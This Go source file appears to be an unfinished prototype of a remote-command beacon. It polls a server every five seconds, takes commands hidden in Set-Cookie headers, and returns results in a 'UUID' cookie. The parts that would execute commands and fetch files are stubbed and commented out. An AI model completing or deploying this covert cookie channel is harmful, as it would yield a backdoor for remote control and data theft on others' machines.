package main

import (
	"fmt"
	"net"
	"net/http"
	"time"
)

func serverWorker(clientIp net.IP) {
	fmt.Printf("Got connection from %v\n", clientIp.String())

	results := make(chan string)

	client := &http.Client{}

	//resp, err := client.Get(clientIp.String())

	ticker := time.NewTicker(time.Second * 5)
	for _ = range ticker.C {

		//read from the response buffer
		request, err := http.NewRequest("GET", "http://"+clientIp.String()+":8000", nil)
		if err != nil {
			panic(err)
		}

		request.Close = true

		select {
		//create cookie
		case resultStr, ok := <-results:

			if !ok {
				return
			}
			var myCookie http.Cookie
			myCookie.Name = "UUID"
			myCookie.Value = resultStr
			myCookie.MaxAge = 15
			myCookie.Secure = false
			myCookie.HttpOnly = false

			//encode data into a response cookie

			request.AddCookie(&myCookie)
			fmt.Println("Adding cookie")
		default:
		}

		//send http request to "server"
		response, err := client.Do(request)
		if err != nil {
			panic(err)
		}

		//get response
		cookieStr := response.Header.Get("Set-Cookie")
		//see if there is a command within the cookie returned
		if cookieStr == "" {
			continue
		}
		//if cookie, exec a command worker with said command

		go runCommand(cookieStr, results)

	}
}

func runCommand(command string, results chan<- string) {

	//	commandParts := strings.Split(command, " ")

	fmt.Println(command)

	results <- command + "done"

	/*
		//exec
		switch commandParts[0]{
			case "exec":
			os.Cmd(commandParts[1])

			case "chdir":

			case "watch":

			case "getFile":
		}

		//chdir

		//watch

		//getFile

	*/

}

/*
func waitForConnection(c cookieHandler) {
	var server http.Server

	server.Handler = c
	server.Addr = ":8000"
	server.ListenAndServe()

	//http.HandleFunc("/", cookieHandler)
	//http.ListenAndServe(":8000", nil)
}

func (c *cookieHandler) ServeHTTP(writer http.ResponseWriter, request *http.Request) {

	cookie, err := request.Cookie("UUID")
	if err != nil {
		println(err.Error())
	}
	println(cookie.String())
	c.responses <- cookie.String()

	var myCookie http.Cookie
	myCookie.Name = "UUID"
	myCookie.Value = <-c.commands
	myCookie.MaxAge = -1
	myCookie.Secure = false
	myCookie.HttpOnly = false

	writer.Header().Set("Set-Cookie", myCookie.String())

	io.WriteString(writer, "Hello world!")
}

*/
